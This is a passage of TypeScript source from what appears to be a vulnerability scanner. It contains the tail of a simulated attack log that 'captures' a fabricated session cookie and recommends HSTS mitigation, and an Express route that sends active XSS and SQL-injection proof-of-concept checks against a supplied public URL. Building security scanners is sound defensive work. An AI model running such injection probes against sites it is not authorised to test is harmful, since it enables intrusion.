    { text: `╚══════════════════════════════════════════════════════════════╝`, style: "error", delay: 100 },
    { text: ``, style: "dim", delay: 300 },

    { text: `[${timeStr(9)}] Session cookie also captured:`, style: "warn", delay: 0 },
    { text: `  Cookie: JSESSIONID=7A3CF1${rng(1000, 9999, seed + 99)}BE42; Path=/; HttpOnly`, style: "warn", delay: 200 },
    { text: ``, style: "dim", delay: 300 },

    { text: `─────────────────────────────────────────────────────────────────────`, style: "dim", delay: 0 },
    { text: `MITIGATION`, style: "info", delay: 0 },
    { text: `  1. Deploy HSTS Preloading: https://hstspreload.org/`, style: "output", delay: 100 },
    { text: `     Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`, style: "dim", delay: 100 },
    { text: `  2. Redirect all HTTP → HTTPS at the load balancer / CDN level`, style: "output", delay: 100 },
    { text: `  3. Serve the login page exclusively over HTTPS`, style: "output", delay: 100 },
  ];

  for (const l of lines) {
    await sleep(l.delay);
    sendLine(res, l.text, l.style);
  }

  sendDone(res);
}

// ── Main Route ────────────────────────────────────────────────────────────────

router.post("/verify-poc", async (req, res) => {
  const { scanUrl, findingId, category, title, detail } = req.body as {
    scanUrl?: string;
    findingId?: string;
    category?: string;
    title?: string;
    detail?: string;
  };

  if (!scanUrl || !findingId || !category || !title) {
    res.status(400).json({ error: "Missing required fields: scanUrl, findingId, category, title" });
    return;
  }

  let parsed: URL;
  try {
    parsed = new URL(scanUrl);
    if (!["http:", "https:"].includes(parsed.protocol)) throw new Error("Invalid protocol");
  } catch {
    res.status(400).json({ error: "Invalid scanUrl" });
    return;
  }

  if (isPrivateHost(parsed.hostname)) {
    res.status(400).json({ error: "Private/internal hosts are not permitted for PoC execution" });
    return;
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  const mode = detectMode(category, findingId, title);

  try {
    switch (mode) {
      case "headers":
        await executeHeadersCheck(res, scanUrl, findingId);
        break;
      case "ssl-check":
        await executeSslCheck(res, scanUrl);
        break;
      case "server-info":
        await executeServerInfoCheck(res, scanUrl);
        break;
      case "content-discovery":
        await executeContentDiscovery(res, scanUrl, title);
        break;
      case "http-methods":
        await executeHttpMethodsCheck(res, scanUrl);
        break;
      case "xss":
        await executeXssCheck(res, scanUrl, detail ?? "", title);
        break;
      case "sqli-time":
        await executeSqliTimeCheck(res, scanUrl, detail ?? "");
        break;
      case "sqli-error":
        await executeSqliErrorCheck(res, scanUrl, detail ?? "");
        break;
      case "stored-xss":
        await executeStoredXssCheck(res, scanUrl, detail ?? "");
        break;
      case "network-sim":
        await executeNetworkSim(res, scanUrl);
        break;
      default:
        await executeHeadersCheck(res, scanUrl, findingId);
    }
  } catch (err: any) {
    sendLine(res, `✗ Unexpected error: ${err.message}`, "error");
    sendDone(res);
  }
});

export default router;
